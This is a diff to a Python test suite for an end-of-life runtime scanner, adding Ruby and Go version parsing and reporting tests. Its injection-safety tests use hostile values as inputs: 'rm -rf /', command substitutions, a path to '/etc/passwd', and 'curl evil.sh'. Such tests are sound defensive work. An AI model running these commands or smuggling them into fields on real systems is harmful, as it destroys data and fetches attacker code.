@@ -15,9 +15,11 @@ from dev_team.eolscan import (
     _match_cycle,
     detect_runtimes,
     parse_global_json_sdk,
+    parse_go_mod,
     parse_nvmrc,
     parse_package_json_engines,
     parse_python_version,
+    parse_ruby_version,
     parse_runtime_txt,
     query_eol,
     scan_eol,
@@ -102,6 +104,28 @@ def test_parse_global_json_sdk_malformed_never_raises():
     assert parse_global_json_sdk("") is None
 
 
+def test_parse_ruby_version():
+    assert parse_ruby_version("3.2.0\n") == ("ruby", "3.2.0")
+    assert parse_ruby_version("3.2.0\n3.1.0\n") == ("ruby", "3.2.0")
+
+
+def test_parse_ruby_version_malformed_never_raises():
+    assert parse_ruby_version("") is None
+    assert parse_ruby_version("   \n") is None
+    assert parse_ruby_version("system") is None
+
+
+def test_parse_go_mod():
+    assert parse_go_mod("module example.com/foo\n\ngo 1.21\n") == ("go", "1.21")
+    assert parse_go_mod("module example.com/foo\n\ngo 1.21.3\n") == ("go", "1.21.3")
+
+
+def test_parse_go_mod_malformed_never_raises():
+    assert parse_go_mod("module example.com/foo\n") is None  # no go directive
+    assert parse_go_mod("") is None
+    assert parse_go_mod("module example.com/foo\n\ngo unknown\n") is None
+
+
 # --- detect_runtimes ----------------------------------------------------------------
 
 
@@ -126,13 +150,31 @@ def test_detect_runtimes_multiple_products():
             ".nvmrc": "18.17.0",
             ".python-version": "3.11.4",
             "global.json": json.dumps({"sdk": {"version": "8.0.100"}}),
+            ".ruby-version": "3.2.0",
+            "go.mod": "module example.com/foo\n\ngo 1.21.3\n",
         }
     )
     runtimes = detect_runtimes(ws)
     assert sorted((r.product, r.version) for r in runtimes) == [
         ("dotnet", "8.0.100"),
+        ("go", "1.21.3"),
         ("nodejs", "18.17.0"),
         ("python", "3.11.4"),
+        ("ruby", "3.2.0"),
+    ]
+
+
+def test_detect_runtimes_dedupes_ruby_and_go_alone():
+    ws = InMemoryWorkspace(
+        {
+            ".ruby-version": "3.2.0",
+            "go.mod": "module example.com/foo\n\ngo 1.21\n",
+        }
+    )
+    runtimes = detect_runtimes(ws)
+    assert sorted((r.product, r.version) for r in runtimes) == [
+        ("go", "1.21"),
+        ("ruby", "3.2.0"),
     ]
 
 
@@ -274,6 +316,37 @@ def test_scan_eol_reports_statuses_for_detected_runtimes():
     assert as_dict["statuses"][0]["runtime"]["product"] in {"nodejs", "python", "dotnet"}
 
 
+def test_scan_eol_reports_statuses_for_ruby_and_go():
+    ws = InMemoryWorkspace(
+        {
+            ".ruby-version": "3.2.0",
+            "go.mod": "module example.com/foo\n\ngo 1.21.3\n",
+            "global.json": json.dumps({"sdk": {"version": "8.0.100"}}),
+        }
+    )
+
+    def fetch(product):
+        if product == "ruby":
+            return [{"cycle": "3.2", "eol": _PAST_EOL}]
+        if product == "go":
+            return [{"cycle": "1.21", "eol": _FUTURE_EOL}]
+        return [{"cycle": "6.0", "eol": _FUTURE_EOL}]  # dotnet: no cycle "8.0"
+
+    scan = scan_eol(ws, fetch=fetch)
+    assert scan.queried is True
+    assert scan.error is None
+    by_product = {s.runtime.product: s for s in scan.statuses}
+    assert by_product["ruby"].end_of_life is True
+    assert by_product["ruby"].eol_date == _PAST_EOL
+    assert by_product["go"].end_of_life is False
+    assert by_product["go"].eol_date == _FUTURE_EOL
+    assert by_product["dotnet"].end_of_life == "unknown"
+    rendered = scan.render()
+    assert "Ruby 3.2.0" in rendered
+    assert "Go 1.21.3" in rendered
+    assert "END OF LIFE" in rendered
+
+
 def test_scan_eol_degrades_on_fetch_failure():
     ws = InMemoryWorkspace({".nvmrc": "18.17.0"})
 
@@ -376,6 +449,13 @@ def test_crafted_version_strings_degrade_to_unknown_not_a_false_match():
         )
 
 
+def test_crafted_ruby_version_and_go_mod_content_never_parses_to_a_version():
+    malicious = ["; rm -rf /", "../../etc/passwd", "$(whoami)", "`id`"]
+    for content in malicious:
+        assert parse_ruby_version(content) is None
+        assert parse_go_mod(f"module x\n\ngo {content}\n") is None
+
+
 def test_crafted_manifest_content_causes_no_subprocess_or_filesystem_writes(
     monkeypatch,
 ):
@@ -393,6 +473,8 @@ def test_crafted_manifest_content_causes_no_subprocess_or_filesystem_writes(
             "global.json": json.dumps({"sdk": {"version": "$(whoami)"}}),
             "runtime.txt": "python-`id`",
             "package.json": json.dumps({"engines": {"node": ">=1 && curl evil.sh"}}),
+            ".ruby-version": "; rm -rf /",
+            "go.mod": "module x\n\ngo $(whoami)\n",
         }
     )
     monkeypatch.setattr(ws, "write_text", _boom)
